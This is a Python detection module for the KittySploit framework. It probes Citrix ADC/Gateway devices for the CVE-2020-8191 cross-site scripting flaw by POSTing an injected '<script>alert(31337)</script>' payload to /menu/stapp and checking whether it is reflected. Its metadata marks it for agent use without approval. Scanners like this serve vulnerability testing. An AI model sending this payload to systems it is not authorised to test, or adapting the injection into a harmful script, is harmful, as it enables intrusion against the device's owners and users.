#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix ADC and Citrix Gateway versions before 13."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix ADC/Gateway - Cross-Site Scripting Detection',
        'description': 'Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 contain a cross-site scripting vulnerability due to improper input validation.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'citrix', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX276688',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8191',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/jweny/pocassistdb',
            'https://github.com/stratosphereips/nist-cve-search-tool',
        ],
        'cve': 'CVE-2020-8191',
    }

    def run(self):
        path = '/menu/stapp'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'X-NITRO-USER': 'xpyZxwy6'}, data='sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</title><script>alert(31337)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Citrix ADC/Gateway - Cross-Site Scripting detected', path=path)
            return True
        return False

